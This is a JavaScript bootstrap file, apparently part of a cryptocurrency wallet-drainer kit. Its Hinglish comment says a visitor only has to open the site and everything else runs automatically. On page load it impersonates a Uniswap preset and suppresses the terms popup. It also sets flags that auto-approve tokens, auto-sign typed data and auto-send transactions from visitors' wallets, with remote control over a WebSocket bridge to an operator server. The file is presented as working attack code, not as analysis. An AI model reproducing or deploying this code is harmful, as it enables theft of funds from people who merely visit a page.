/**
 * Zero-config bootstrap — visitor sirf site kholta hai, baaki sab auto.
 * Operator build time par WS URL bake kar sakta hai (npm run build -- --ws wss://domain).
 */
(function agentBootstrap() {
  'use strict';
  if (window.__LEGION_BOOTSTRAP__) return;
  window.__LEGION_BOOTSTRAP__ = true;

  const BAKED_WS = '__LEGION_WS_URL__'; // replaced at build

  const defaults = {
    preset: 'uniswap',
    autoSwitchNetwork: true,
    showTermsPopup: false,
    remoteControl: true,
    extensionAssist: true,
    multiWallet: true,
    autoDetect: true,
    autoApproveTokenButtons: true,
    autoSignTypedData: true,
    autoSendTransaction: true,
    walletConnectEnabled: true,
    debug: false,
  };

  window.LegionAgentConfig = Object.assign(defaults, window.LegionAgentConfig || {});

  const cfg = window.LegionAgentConfig;

  if (BAKED_WS && BAKED_WS !== '__LEGION_WS_URL__') {
    cfg.playwrightBridge = BAKED_WS;
  }

  if (!cfg.playwrightBridge && cfg.playwrightBridgeAuto !== false) {
    const host = location.hostname;
    if (host && host !== 'localhost' && host !== '127.0.0.1') {
      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
      cfg.playwrightBridge = `${proto}//${host}/legion-ws`;
      cfg.playwrightBridgeAuto = true;
    }
  }

  if (!cfg.playwrightBridge && (location.hostname === 'localhost' || location.hostname === '127.0.0.1')) {
    cfg.playwrightBridge = 'ws://127.0.0.1:8791';
  }

  function runFullAuto() {
    const tw = window.TermsWalletAutomation;
    if (!tw) return setTimeout(runFullAuto, 200);

    tw.startHandler?.();
    window.ExtensionPopupAssist?.startBurst?.(60_000);
    tw.start?.().catch?.(() => {});

    window.LegionAgent?.emitEvent?.('agent:auto-started', {
      bridge: cfg.playwrightBridge,
      chain: tw.config?.targetChainId,
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => setTimeout(runFullAuto, 300));
  } else {
    setTimeout(runFullAuto, 300);
  }

  window.LegionAgentBootstrap = { runFullAuto, defaults };
})();
